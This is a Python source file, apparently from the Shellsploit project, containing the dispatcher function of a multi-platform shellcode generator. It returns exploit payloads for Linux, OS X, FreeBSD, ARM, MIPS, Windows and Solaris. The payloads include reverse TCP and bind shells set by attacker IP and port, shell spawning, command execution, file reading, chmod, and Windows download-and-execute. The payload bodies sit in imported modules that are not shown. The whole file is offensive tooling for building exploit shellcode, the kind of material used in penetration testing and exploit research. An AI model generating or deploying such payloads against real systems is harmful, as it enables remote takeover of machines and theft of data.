#------------------Bombermans Team---------------------------------# 
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#


def generator( choose, shellcode, argv="None", argv2="None"):
	if choose == "linux_x86":
		if shellcode == "bin_sh":
			from Linux86.bin_shx86 import bin_shx86
			return bin_shx86()

		elif shellcode == "exec":
			from Linux86.execc import execc
			return execc( argv)

		elif shellcode == "read":
			from Linux86.readfilex86 import readx86
			from database.stackconvert import stackconvertSTR
			return readx86( stackconvertSTR(argv))

		#elif shellcode == "download&exec":
			#from Linux86.download import download
			#from database.stackconvert import stackconvertSTR
			#cache = argv.split("/")[-1]
			#if len(cache) != 1:
				#return "Please change file name with one character.\nThat will provide shortest shellcode."	
			#else:
				#cache = cache.encode("hex")
			#return download( cache, stackconvertSTR(argv))

		elif shellcode == "chmod":
			from Linux86.chmod import ch
			from database.stackconvert import stackconvertSTR
			return ch( stackconvertSTR(argv))

		elif shellcode == "tcp_bind":
			from Linux86.tcp_bindx86 import tcp_bindx86
			from database.stackconvert import PORT
			return tcp_bindx86(  PORT(argv))

		elif shellcode == "reverse_tcp":
			from Linux86.reverse_tcpx86 import reverse_tcpx86
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcpx86( IP(argv), PORT(argv2))

	elif choose == "linux_x64":
		if shellcode == "bin_sh":
			from Linux64.bin_shx64 import bin_shx64
			return bin_shx64()

		elif shellcode == "tcp_bind":
			from Linux64.tcp_bindx64 import tcp_bindx64
			from database.stackconvert import PORT
			return tcp_bindx64( PORT(argv))

		elif shellcode == "reverse_tcp":
			from Linux64.reverse_tcpx64 import reverse_tcpx64
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcpx64( IP(argv), PORT(argv2))
		
		elif shellcode == "read":
			from Linux64.readfilex64 import readx64
			from database.stackconvert import plaintext
			return readx64( plaintext(argv))


	elif choose == "linux":
		from Linux.magic import merlin
		if shellcode == "bin_sh":
			from Linux86.bin_shx86 import bin_shx86
			from Linux64.bin_shx64 import bin_shx64 
			value = hex(len(bin_shx86().split("\\x"))-1)[2:]
			value = "\\x%s" % value
			return merlin( value)+bin_shx86()+bin_shx64()

		elif shellcode == "read":
			from Linux86.readfilex86 import readx86
			from Linux64.readfilex64 import readx64
			from database.stackconvert import stackconvertSTR
			from database.stackconvert import plaintext
			value = hex(len(readx86( stackconvertSTR(argv)).split("\\x"))-1)[2:]
			value = "\\x%s" % value
			return merlin( value)+readx86( stackconvertSTR(argv))+readx64( plaintext(argv))
		
		elif shellcode == "reverse_tcp":
			from Linux64.reverse_tcpx64 import reverse_tcpx64
			from Linux86.reverse_tcpx86 import reverse_tcpx86
			from database.stackconvert import IP
			from database.stackconvert import PORT
			value = hex(len(reverse_tcpx86( IP(argv), PORT(argv2)).split("\\x"))-1)[2:]
			value = "\\x%s" % value
			return merlin( value)+reverse_tcpx86( IP(argv), PORT(argv2))+reverse_tcpx64( IP(argv), PORT(argv2))

		elif shellcode == "tcp_bind":
			from Linux64.tcp_bindx64 import tcp_bindx64
			from Linux86.tcp_bindx86 import tcp_bindx86
			from database.stackconvert import PORT
			value = hex(len(tcp_bindx86( PORT(argv)).split("\\x"))-1)[2:]
			value = "\\x%s" % value
			return merlin( value)+tcp_bindx86(  PORT(argv))+tcp_bindx64( PORT(argv))




	elif choose == "osx86":
		if shellcode == "tcp_bind":
			from OSX86.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			return tcp_bind( PORT(argv))

		elif shellcode == "bin_sh":
			from OSX86.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "reverse_tcp":
			from OSX86.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

	elif choose == "osx64":
		if shellcode == "bin_sh":
			from OSX64.bin_sh import bin_sh
			return bin_sh()
		
		elif shellcode == "reverse_tcp":
			from OSX64.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))
		
		elif shellcode == "tcp_bind":
			from OSX64.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			return tcp_bind( PORT(argv))

	elif choose == "freebsd_x86":
		if shellcode == "bin_sh":
			from FreeBSDx86.bin_sh import bin_sh
			return bin_sh()			
		

		elif shellcode == "read":
			from FreeBSDx86.read import read
			from database.plaintext import plaintext
			return read(plaintext(argv))


		elif shellcode == "reverse_tcp":
			from FreeBSDx86.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv2), PORT(argv))
		

		elif shellcode == "reverse_tcp2":
			from FreeBSDx86.reverse_tcp2 import reverse_tcp2
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp2( IP(argv2), PORT(argv))
		
		elif shellcode == "tcp_bind":
			from FreeBSDx86.tcp_bind import tcp_bind
			if len(str(argv)) == 5:
				PORT = "\\x%s\\x%s" % (hex(int(argv))[2:][0:2],hex(int(argv))[2:][2:])
			else:
				PORT = "\\x%s\\x%s" % ("0"+hex(int(argv))[2:][0],hex(int(argv))[2:][1:])
			return tcp_bind( PORT)

		elif shellcode == "exec":
			from FreeBSDx86.execc import execc
			from database.plaintext import plaintext
			command = '/bin/sh -c %s' % argv
			return execc(plaintext(argv))
		
	elif choose == "freebsd_x64":
		if shellcode == "bin_sh":
			from FreeBSDx64.bin_sh import bin_sh
			return bin_sh()		
		
		elif shellcode == "exec":
			from FreeBSDx64.execc import execc
			return execc()	


		elif shellcode == "tcp_bind":
			from database.stackconvert import plaintext
			from database.stackconvert import PORT
			from FreeBSDx64.tcp_bind import tcp_bind
			return tcp_bind( PORT(argv), plaintext(argv2))	

		elif shellcode == "reverse_tcp":
			from FreeBSDx64.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))	

	elif choose == "linux_arm":
		if shellcode == "chmod":
			from LinuxARM.chmod import chmod
			from database.stackconvert import plaintext
			if argv == "None":
				return "FILE PATH must be declared."
			else:
				return chmod( plaintext(argv))

		elif shellcode == "bin_sh":
			from LinuxARM.bin_sh import bin_sh
			return bin_sh()		

		elif shellcode == "exec":
			from LinuxARM.execc import execc
			return execc( argv)	

		elif shellcode == "reverse_tcp":
			from LinuxARM.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv2), PORT(argv))

	elif choose == "linux_mips":
		if shellcode == "reverse_tcp":
			from LinuxMIPS.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

		elif shellcode == "bin_sh":
			from LinuxMIPS.bin_sh import bin_sh
			return bin_sh()
		elif shellcode == "chmod": 	
			from LinuxMIPS.chmod import chmod
			from database.stackconvert import plaintext
			return chmod( plaintext(argv))

		elif shellcode == "tcp_bind":
			from LinuxMIPS.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			return tcp_bind( PORT(argv))

	elif choose == "windows":
		if shellcode == "messagebox":
			from Windows import messagebox
			from database.stackconvert import stackconvertSTR
			return messagebox.messagebox( stackconvertSTR(argv, True))

		elif shellcode == "downloandandexecute":
			from Windows import downloadandexecute
			from database.stackconvert import rawSTR
			from database.stackconvert import stackconvertSTR
			return downloadandexecute.downANDexecute( rawSTR(argv), stackconvertSTR(argv2, True))
		
		elif shellcode == "exec":
			from Windows import execc
			return execc.WinExec(argv)

	elif choose == "solarisx86":	
		if shellcode == "read":
			from Solarisx86.read import read
			from database.plaintext import plaintext
			return read( plaintext(argv))	
		elif shellcode == "reverse_tcp":
			from Solarisx86.reverse_tcp import reverse_tcp
			from database.stackconvert import IP
			from database.stackconvert import PORT
			return reverse_tcp( IP(argv2), PORT(argv))
		elif shellcode == "bin_sh":
			from Solarisx86.bin_sh import bin_sh
			return bin_sh()
		elif shellcode == "tcp_bind":
			from Solarisx86.tcp_bind import tcp_bind
			from database.stackconvert import PORT
			return tcp_bind( PORT(argv))
